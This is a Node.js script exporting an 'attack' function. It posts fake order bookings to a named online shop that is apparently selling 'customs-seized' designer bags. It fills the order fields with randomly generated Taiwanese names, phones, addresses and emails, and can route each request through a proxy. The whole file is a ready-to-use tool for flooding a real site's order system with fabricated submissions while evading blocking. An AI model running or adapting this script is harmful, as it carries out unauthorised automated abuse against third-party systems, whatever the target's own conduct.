const Random = require('./tw-random')


const axios = require('axios')

const data = {
  item_id: '24',
  item_name: '海關扣押，司法拍賣包包史上最低折扣，僅售千元價，限時3天',
  item_price: '0.0',
  url: 'http://t.beds-ym.com/shop/?m=Item&a=show&id=24',
  item_params: '司法拍賣包包史上最低折扣',
  'options[1]': '無',
  chima_price: '0',
  'options1111[Array]': '香奈兒【CHANEL】/ 黑白色',
  color_price: '2898',
  quantity: '1',
  name: Random.getRandomName(),
  mobile: Random.getRandomPhone(),
  address: Random.getRandomAddress(),
  mail: Random.getRandomEmail(),
  remark: Random.getRandomRemark(),
  payment: '1',
  shipping_price: '0'
}


const attack = async (proxy) => {

  try {



    const postData = {
      method: 'post',
      url: 'http://t.beds-ym.com/shop/?m=Show&a=booking',
      data: data,
      transformRequest: [() => {
        let ret = ''
        for (let it in data) {
          ret += encodeURIComponent(it) + '=' + encodeURIComponent(data[it]) + '&'
        }
        return ret
      }],
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      
    }

    if (proxy) {
      postData['proxy'] = proxy
    }
    


    const { data:resultData } = await axios(postData)

    if (!resultData) {return 'no data string response'}

    console.log(resultData)
    if (resultData.includes('"status":1') && resultData.includes('"info":"success"')) {
      return 'ok'
    }else {
      return 'notok'
    }

  } catch (e) {
    return e.message 
  }

}


// attack().then(result => {
//   console.log(result)
// }).catch(e => {
//   console.log(e.message)
// })

module.exports.attack = attack








